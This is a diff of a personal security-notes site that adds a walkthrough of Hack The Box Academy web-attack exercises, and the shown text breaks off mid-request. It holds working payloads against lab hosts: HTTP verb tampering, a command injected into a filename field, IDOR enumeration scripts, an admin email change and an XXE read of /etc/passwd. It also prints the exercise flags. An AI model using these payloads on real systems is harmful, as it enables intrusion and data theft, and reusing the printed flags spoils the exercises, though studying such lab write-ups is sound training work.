@@ -689,6 +689,8 @@
       
         
       
+        
+      
     
     
     
@@ -5071,6 +5073,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../xxeinjector/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    xxeinjector
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../ysoserial/" class="md-nav__link">
         
   
@@ -6880,6 +6903,8 @@
       
         
       
+        
+      
     
     
     
@@ -7529,6 +7554,27 @@
   
   <span class="md-ellipsis">
     HTB responder
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-sauna/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB sauna
   </span>
   
 
@@ -24596,19 +24642,426 @@ user: netdb</p>
 <h2 id="file-upload-attacks"><a href="https://academy.hackthebox.com/module/details/136">File Upload Attacks</a></h2>
 <h2 id="command-injections"><a href="https://academy.hackthebox.com/module/details/109">Command Injections</a></h2>
 <h2 id="web-attacks"><a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a></h2>
+<h3 id="http-verb-tampering">HTTP Verb Tampering</h3>
+<p><strong>Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.</strong></p>
+<p>We access the website. Observe the Reset feature that triggers this request:</p>
+<div class="language-HTML highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-313-1">1</a></span>
+<span class="normal"><a href="#__codelineno-313-2">2</a></span>
+<span class="normal"><a href="#__codelineno-313-3">3</a></span>
+<span class="normal"><a href="#__codelineno-313-4">4</a></span>
+<span class="normal"><a href="#__codelineno-313-5">5</a></span>
+<span class="normal"><a href="#__codelineno-313-6">6</a></span>
+<span class="normal"><a href="#__codelineno-313-7">7</a></span>
+<span class="normal"><a href="#__codelineno-313-8">8</a></span>
+<span class="normal"><a href="#__codelineno-313-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-313-1"><a id="__codelineno-313-1" name="__codelineno-313-1"></a>GET /admin/reset.php? HTTP/1.1
+</span><span id="__span-313-2"><a id="__codelineno-313-2" name="__codelineno-313-2"></a>Host: 94.237.54.42:42078
+</span><span id="__span-313-3"><a id="__codelineno-313-3" name="__codelineno-313-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-313-4"><a id="__codelineno-313-4" name="__codelineno-313-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-313-5"><a id="__codelineno-313-5" name="__codelineno-313-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-313-6"><a id="__codelineno-313-6" name="__codelineno-313-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-313-7"><a id="__codelineno-313-7" name="__codelineno-313-7"></a>Connection: keep-alive
+</span><span id="__span-313-8"><a id="__codelineno-313-8" name="__codelineno-313-8"></a>Referer: http://94.237.54.42:42078/
+</span><span id="__span-313-9"><a id="__codelineno-313-9" name="__codelineno-313-9"></a>Upgrade-Insecure-Requests: 1
+</span></code></pre></div></td></tr></table></div>
+<p>There is a modal asking for Basic Authentication, meaning that, at least GET /admin endpoint is protected by authentication. However we can trick the server by requesting the deletion of the file directly with: </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-314-1">1</a></span>
+<span class="normal"><a href="#__codelineno-314-2">2</a></span>
+<span class="normal"><a href="#__codelineno-314-3">3</a></span>
+<span class="normal"><a href="#__codelineno-314-4">4</a></span>
+<span class="normal"><a href="#__codelineno-314-5">5</a></span>
+<span class="normal"><a href="#__codelineno-314-6">6</a></span>
+<span class="normal"><a href="#__codelineno-314-7">7</a></span>
+<span class="normal"><a href="#__codelineno-314-8">8</a></span>
+<span class="normal"><a href="#__codelineno-314-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-314-1"><a id="__codelineno-314-1" name="__codelineno-314-1"></a>DEL /admin/reset.php?notes.txt HTTP/1.1
+</span><span id="__span-314-2"><a id="__codelineno-314-2" name="__codelineno-314-2"></a>Host: 94.237.54.42:42078
+</span><span id="__span-314-3"><a id="__codelineno-314-3" name="__codelineno-314-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-314-4"><a id="__codelineno-314-4" name="__codelineno-314-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-314-5"><a id="__codelineno-314-5" name="__codelineno-314-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-314-6"><a id="__codelineno-314-6" name="__codelineno-314-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-314-7"><a id="__codelineno-314-7" name="__codelineno-314-7"></a>Connection: keep-alive
+</span><span id="__span-314-8"><a id="__codelineno-314-8" name="__codelineno-314-8"></a>Referer: http://94.237.54.42:42078/index.php
+</span><span id="__span-314-9"><a id="__codelineno-314-9" name="__codelineno-314-9"></a>Upgrade-Insecure-Requests: 1
+</span></code></pre></div></td></tr></table></div>
+<p>Flag is showcased after that. Results: HTB{4lw4y5_c0v3r_4ll_v3rb5}</p>
+<p><strong>To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-315-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-315-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-315-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-315-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-315-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-315-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-315-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-315-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-315-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-315-10">10</a></span>
+<span class="normal"><a href="#__codelineno-315-11">11</a></span>
+<span class="normal"><a href="#__codelineno-315-12">12</a></span>
+<span class="normal"><a href="#__codelineno-315-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-315-1"><a id="__codelineno-315-1" name="__codelineno-315-1"></a>POST /index.php HTTP/1.1
+</span><span id="__span-315-2"><a id="__codelineno-315-2" name="__codelineno-315-2"></a>Host: 94.237.54.116:49636
+</span><span id="__span-315-3"><a id="__codelineno-315-3" name="__codelineno-315-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-315-4"><a id="__codelineno-315-4" name="__codelineno-315-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-315-5"><a id="__codelineno-315-5" name="__codelineno-315-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-315-6"><a id="__codelineno-315-6" name="__codelineno-315-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-315-7"><a id="__codelineno-315-7" name="__codelineno-315-7"></a>Connection: keep-alive
+</span><span id="__span-315-8"><a id="__codelineno-315-8" name="__codelineno-315-8"></a>Referer: http://94.237.54.116:49636/
+</span><span id="__span-315-9"><a id="__codelineno-315-9" name="__codelineno-315-9"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-315-10"><a id="__codelineno-315-10" name="__codelineno-315-10"></a>Content-type: application/x-www-form-urlencoded
+</span><span id="__span-315-11"><a id="__codelineno-315-11" name="__codelineno-315-11"></a>Content-Length: 28
+</span><span id="__span-315-12"><a id="__codelineno-315-12" name="__codelineno-315-12"></a>
+</span><span id="__span-315-13"><a id="__codelineno-315-13" name="__codelineno-315-13"></a>filename=one;cp+/flag.txt+./
+</span></code></pre></div></td></tr></table></div>
+<p>Now access to http://94.237.54.116:49636/flag.txt
+Results: HTB{b3_v3rb_c0n51573n7}</p>
+<h3 id="insecure-direct-object-references-idor">Insecure Direct Object References (IDOR)</h3>
+<p><strong>Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.</strong></p>
+<p>We can run an intruder attack, being the payload the uid parameter. Finally, this payload will return a txt file</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-316-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-316-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-316-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-316-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-316-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-316-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-316-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-316-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-316-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-316-10">10</a></span>
+<span class="normal"><a href="#__codelineno-316-11">11</a></span>
+<span class="normal"><a href="#__codelineno-316-12">12</a></span>
+<span class="normal"><a href="#__codelineno-316-13">13</a></span>
+<span class="normal"><a href="#__codelineno-316-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-316-1"><a id="__codelineno-316-1" name="__codelineno-316-1"></a>POST /documents.php HTTP/1.1
+</span><span id="__span-316-2"><a id="__codelineno-316-2" name="__codelineno-316-2"></a>Host: 94.237.54.116:37509
+</span><span id="__span-316-3"><a id="__codelineno-316-3" name="__codelineno-316-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-316-4"><a id="__codelineno-316-4" name="__codelineno-316-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-316-5"><a id="__codelineno-316-5" name="__codelineno-316-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-316-6"><a id="__codelineno-316-6" name="__codelineno-316-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-316-7"><a id="__codelineno-316-7" name="__codelineno-316-7"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-316-8"><a id="__codelineno-316-8" name="__codelineno-316-8"></a>Content-Length: 6
+</span><span id="__span-316-9"><a id="__codelineno-316-9" name="__codelineno-316-9"></a>Origin: http://94.237.54.116:37509
+</span><span id="__span-316-10"><a id="__codelineno-316-10" name="__codelineno-316-10"></a>Connection: keep-alive
+</span><span id="__span-316-11"><a id="__codelineno-316-11" name="__codelineno-316-11"></a>Referer: http://94.237.54.116:37509/
+</span><span id="__span-316-12"><a id="__codelineno-316-12" name="__codelineno-316-12"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-316-13"><a id="__codelineno-316-13" name="__codelineno-316-13"></a>
+</span><span id="__span-316-14"><a id="__codelineno-316-14" name="__codelineno-316-14"></a>uid=15
+</span></code></pre></div></td></tr></table></div>
+<p>Accessing the http://94.237.54.116:37509/documents/flag_11dfa168ac8eb2958e38425728623c98.txt returns the flag.</p>
+<p>Also we can do a script that retrieves all files of users 1 to 20</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-317-1">1</a></span>
+<span class="normal"><a href="#__codelineno-317-2">2</a></span>
+<span class="normal"><a href="#__codelineno-317-3">3</a></span>
+<span class="normal"><a href="#__codelineno-317-4">4</a></span>
+<span class="normal"><a href="#__codelineno-317-5">5</a></span>
+<span class="normal"><a href="#__codelineno-317-6">6</a></span>
+<span class="normal"><a href="#__codelineno-317-7">7</a></span>
+<span class="normal"><a href="#__codelineno-317-8">8</a></span>
+<span class="normal"><a href="#__codelineno-317-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-317-1"><a id="__codelineno-317-1" name="__codelineno-317-1"></a><span class="ch">#!/bin/bash</span>
+</span><span id="__span-317-2"><a id="__codelineno-317-2" name="__codelineno-317-2"></a>
+</span><span id="__span-317-3"><a id="__codelineno-317-3" name="__codelineno-317-3"></a><span class="nv">url</span><span class="o">=</span><span class="s2">&quot;http://SERVER_IP:PORT&quot;</span>
+</span><span id="__span-317-4"><a id="__codelineno-317-4" name="__codelineno-317-4"></a>
+</span><span id="__span-317-5"><a id="__codelineno-317-5" name="__codelineno-317-5"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..20<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-317-6"><a id="__codelineno-317-6" name="__codelineno-317-6"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span>link<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$url</span><span class="s2">/documents.php?uid=</span><span class="nv">$i</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s2">&quot;\/documents.*?.pdf&quot;</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-317-7"><a id="__codelineno-317-7" name="__codelineno-317-7"></a><span class="w">                </span>wget<span class="w"> </span>-q<span class="w"> </span><span class="nv">$url</span>/<span class="nv">$link</span>
+</span><span id="__span-317-8"><a id="__codelineno-317-8" name="__codelineno-317-8"></a><span class="w">        </span><span class="k">done</span>
+</span><span id="__span-317-9"><a id="__codelineno-317-9" name="__codelineno-317-9"></a><span class="k">done</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{4ll_f1l35_4r3_m1n3}</p>
+<p><strong>Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.</strong></p>
+<p>After visiting the source code for the response to the request <code>GET /contracts.php HTTP/1.1</code>  we notice the following function:</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-318-1">1</a></span>
+<span class="normal"><a href="#__codelineno-318-2">2</a></span>
+<span class="normal"><a href="#__codelineno-318-3">3</a></span>
+<span class="normal"><a href="#__codelineno-318-4">4</a></span>
+<span class="normal"><a href="#__codelineno-318-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-318-1"><a id="__codelineno-318-1" name="__codelineno-318-1"></a><span class="w"> </span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-318-2"><a id="__codelineno-318-2" name="__codelineno-318-2"></a><span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">downloadContract</span><span class="p">(</span><span class="nx">uid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-318-3"><a id="__codelineno-318-3" name="__codelineno-318-3"></a><span class="w">      </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`/download.php?contract=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">uid</span><span class="p">))</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span><span id="__span-318-4"><a id="__codelineno-318-4" name="__codelineno-318-4"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-318-5"><a id="__codelineno-318-5" name="__codelineno-318-5"></a><span class="w">  </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>The expression <code>${encodeURIComponent(btoa(uid))}</code> performs the following operations: </p>
+<ol>
+<li>
+<p><strong><code>btoa(uid)</code></strong>:</p>
+</li>
+<li>
+<p>The <code>btoa()</code> function encodes a string to <strong>Base64</strong>.</p>
+</li>
+<li><code>uid</code> is a variable or value representing the input string.</li>
+<li>
+<p><strong>Example</strong>: If <code>uid = "user123"</code>, then <code>btoa(uid)</code> will return <code>"dXNlcjEyMw=="</code>.</p>
+</li>
+<li>
+<p><strong><code>encodeURIComponent(...)</code></strong>:</p>
+</li>
+<li>
+<p>The <code>encodeURIComponent()</code> function encodes a URI component by escaping characters that have special meanings in a URI (e.g., <code>&amp;</code>, <code>=</code>, <code>/</code>, etc.).</p>
+</li>
+<li>It ensures the Base64-encoded string is safe for use in URLs.</li>
+</ol>
+<p>We can now perform an Intruder attack with the following request</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-319-1">1</a></span>
+<span class="normal"><a href="#__codelineno-319-2">2</a></span>
+<span class="normal"><a href="#__codelineno-319-3">3</a></span>
+<span class="normal"><a href="#__codelineno-319-4">4</a></span>
+<span class="normal"><a href="#__codelineno-319-5">5</a></span>
+<span class="normal"><a href="#__codelineno-319-6">6</a></span>
+<span class="normal"><a href="#__codelineno-319-7">7</a></span>
+<span class="normal"><a href="#__codelineno-319-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-319-1"><a id="__codelineno-319-1" name="__codelineno-319-1"></a>GET //download.php?contract=(&#39;&amp;1&amp;&#39;) HTTP/1.1
+</span><span id="__span-319-2"><a id="__codelineno-319-2" name="__codelineno-319-2"></a>Host: 94.237.54.116:37509
+</span><span id="__span-319-3"><a id="__codelineno-319-3" name="__codelineno-319-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-319-4"><a id="__codelineno-319-4" name="__codelineno-319-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-319-5"><a id="__codelineno-319-5" name="__codelineno-319-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-319-6"><a id="__codelineno-319-6" name="__codelineno-319-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-319-7"><a id="__codelineno-319-7" name="__codelineno-319-7"></a>Connection: keep-alive
+</span><span id="__span-319-8"><a id="__codelineno-319-8" name="__codelineno-319-8"></a>Upgrade-Insecure-Requests: 1
+</span></code></pre></div></td></tr></table></div>
+<p>And adding the following payload processing:</p>
+<p><img alt="" src="../img/idor01.png" /></p>
+<p>Results: HTB{h45h1n6_1d5_w0n7_570p_m3}</p>
+<p><strong>Try to read the details of the user with 'uid=5'. What is their 'uuid' value?</strong></p>
+<p>We capture our request for reading our profile and change uid to 5 </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-320-1">1</a></span>
+<span class="normal"><a href="#__codelineno-320-2">2</a></span>
+<span class="normal"><a href="#__codelineno-320-3">3</a></span>
+<span class="normal"><a href="#__codelineno-320-4">4</a></span>
+<span class="normal"><a href="#__codelineno-320-5">5</a></span>
+<span class="normal"><a href="#__codelineno-320-6">6</a></span>
+<span class="normal"><a href="#__codelineno-320-7">7</a></span>
+<span class="normal"><a href="#__codelineno-320-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-320-1"><a id="__codelineno-320-1" name="__codelineno-320-1"></a>GET /profile/api.php/profile/5 HTTP/1.1
+</span><span id="__span-320-2"><a id="__codelineno-320-2" name="__codelineno-320-2"></a>Host: 94.237.54.116:37509
+</span><span id="__span-320-3"><a id="__codelineno-320-3" name="__codelineno-320-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-320-4"><a id="__codelineno-320-4" name="__codelineno-320-4"></a>Accept: */*
+</span><span id="__span-320-5"><a id="__codelineno-320-5" name="__codelineno-320-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-320-6"><a id="__codelineno-320-6" name="__codelineno-320-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-320-7"><a id="__codelineno-320-7" name="__codelineno-320-7"></a>Referer: http://94.237.54.116:37509/profile/index.php
+</span><span id="__span-320-8"><a id="__codelineno-320-8" name="__codelineno-320-8"></a>Connection: keep-alive
+</span></code></pre></div></td></tr></table></div>
+<p>Results: eb4fe264c10eb7a528b047aa983a4829</p>
+<p><strong>Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.</strong></p>
+<p>We enumerate users until we find admin one. In my case it was 10. Then we send the following PUT request changing the email:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-321-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-321-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-321-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-321-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-321-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-321-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-321-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-321-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-321-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-321-10">10</a></span>
+<span class="normal"><a href="#__codelineno-321-11">11</a></span>
+<span class="normal"><a href="#__codelineno-321-12">12</a></span>
+<span class="normal"><a href="#__codelineno-321-13">13</a></span>
+<span class="normal"><a href="#__codelineno-321-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-321-1"><a id="__codelineno-321-1" name="__codelineno-321-1"></a>PUT /profile/api.php/profile/10 HTTP/1.1
+</span><span id="__span-321-2"><a id="__codelineno-321-2" name="__codelineno-321-2"></a>Host: 94.237.50.242:58057
+</span><span id="__span-321-3"><a id="__codelineno-321-3" name="__codelineno-321-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-321-4"><a id="__codelineno-321-4" name="__codelineno-321-4"></a>Accept: */*
+</span><span id="__span-321-5"><a id="__codelineno-321-5" name="__codelineno-321-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-321-6"><a id="__codelineno-321-6" name="__codelineno-321-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-321-7"><a id="__codelineno-321-7" name="__codelineno-321-7"></a>Referer: http://94.237.50.242:58057/profile/index.php
+</span><span id="__span-321-8"><a id="__codelineno-321-8" name="__codelineno-321-8"></a>Content-type: application/json
+</span><span id="__span-321-9"><a id="__codelineno-321-9" name="__codelineno-321-9"></a>Content-Length: 179
+</span><span id="__span-321-10"><a id="__codelineno-321-10" name="__codelineno-321-10"></a>Origin: http://94.237.50.242:58057
+</span><span id="__span-321-11"><a id="__codelineno-321-11" name="__codelineno-321-11"></a>Connection: keep-alive
+</span><span id="__span-321-12"><a id="__codelineno-321-12" name="__codelineno-321-12"></a>Cookie: role=staff_admin
+</span><span id="__span-321-13"><a id="__codelineno-321-13" name="__codelineno-321-13"></a>
+</span><span id="__span-321-14"><a id="__codelineno-321-14" name="__codelineno-321-14"></a>{&quot;uid&quot;:&quot;10&quot;,&quot;uuid&quot;:&quot;bfd92386a1b48076792e68b596846499&quot;,&quot;role&quot;:&quot;staff_admin&quot;,&quot;full_name&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;flag@idor.htb&quot;,&quot;about&quot;:&quot;Never gonna give you up, Never gonna let you down&quot;}
+</span></code></pre></div></td></tr></table></div>
+<p>Then we enter in our edit profile section and see the flag.</p>
+<p>Results: HTB{1_4m_4n_1d0r_m4573r}</p>
+<p><strong>Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.</strong></p>
+<p>First we check out that it is vulnerable to XXE.</p>
+<p><img alt="" src="../img/xxe_21.png" /></p>
+<p>This is the request: </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-322-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-322-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-322-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-322-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-322-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-322-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-322-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-322-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-322-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-322-10">10</a></span>
+<span class="normal"><a href="#__codelineno-322-11">11</a></span>
+<span class="normal"><a href="#__codelineno-322-12">12</a></span>
+<span class="normal"><a href="#__codelineno-322-13">13</a></span>
+<span class="normal"><a href="#__codelineno-322-14">14</a></span>
+<span class="normal"><a href="#__codelineno-322-15">15</a></span>
+<span class="normal"><a href="#__codelineno-322-16">16</a></span>
+<span class="normal"><a href="#__codelineno-322-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-322-1"><a id="__codelineno-322-1" name="__codelineno-322-1"></a>POST /submitDetails.php HTTP/1.1
+</span><span id="__span-322-2"><a id="__codelineno-322-2" name="__codelineno-322-2"></a>Host: 10.129.13.187
+</span><span id="__span-322-3"><a id="__codelineno-322-3" name="__codelineno-322-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-322-4"><a id="__codelineno-322-4" name="__codelineno-322-4"></a>Accept: */*
+</span><span id="__span-322-5"><a id="__codelineno-322-5" name="__codelineno-322-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-322-6"><a id="__codelineno-322-6" name="__codelineno-322-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-322-7"><a id="__codelineno-322-7" name="__codelineno-322-7"></a>Content-Type: text/plain;charset=UTF-8
+</span><span id="__span-322-8"><a id="__codelineno-322-8" name="__codelineno-322-8"></a>Content-Length: 205
+</span><span id="__span-322-9"><a id="__codelineno-322-9" name="__codelineno-322-9"></a>Origin: http://10.129.13.187
+</span><span id="__span-322-10"><a id="__codelineno-322-10" name="__codelineno-322-10"></a>Connection: keep-alive
+</span><span id="__span-322-11"><a id="__codelineno-322-11" name="__codelineno-322-11"></a>Referer: http://10.129.13.187/
+</span><span id="__span-322-12"><a id="__codelineno-322-12" name="__codelineno-322-12"></a>
+</span><span id="__span-322-13"><a id="__codelineno-322-13" name="__codelineno-322-13"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+</span><span id="__span-322-14"><a id="__codelineno-322-14" name="__codelineno-322-14"></a>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot; &gt; ]&gt;
+</span><span id="__span-322-15"><a id="__codelineno-322-15" name="__codelineno-322-15"></a>&lt;root&gt;
+</span><span id="__span-322-16"><a id="__codelineno-322-16" name="__codelineno-322-16"></a>&lt;name&gt;
+</span><span id="__span-322-17"><a id="__codelineno-322-17" name="__codelineno-322-17"></a>[SNIP]
+</span></code></pre></div></td></tr></table></div>
+<p>Now we retrieve the file: </p>
+<p><img alt="" src="../img/xxe_22.png" /></p>
+<p>The request:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-323-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-323-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-323-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-323-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-323-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-323-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-323-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-323-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-323-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-323-10">10</a></span>
+<span class="normal"><a href="#__codelineno-323-11">11</a></span>
+<span class="normal"><a href="#__codelineno-323-12">12</a></span>
+<span class="normal"><a href="#__codelineno-323-13">13</a></span>
+<span class="normal"><a href="#__codelineno-323-14">14</a></span>
+<span class="normal"><a href="#__codelineno-323-15">15</a></span>
+<span class="normal"><a href="#__codelineno-323-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-323-1"><a id="__codelineno-323-1" name="__codelineno-323-1"></a>POST /submitDetails.php HTTP/1.1
+</span><span id="__span-323-2"><a id="__codelineno-323-2" name="__codelineno-323-2"></a>Host: 10.129.13.187
+</span><span id="__span-323-3"><a id="__codelineno-323-3" name="__codelineno-323-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-323-4"><a id="__codelineno-323-4" name="__codelineno-323-4"></a>Accept: */*
+</span><span id="__span-323-5"><a id="__codelineno-323-5" name="__codelineno-323-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-323-6"><a id="__codelineno-323-6" name="__codelineno-323-6"></a>Accept-Encoding: gzip, deflate, br
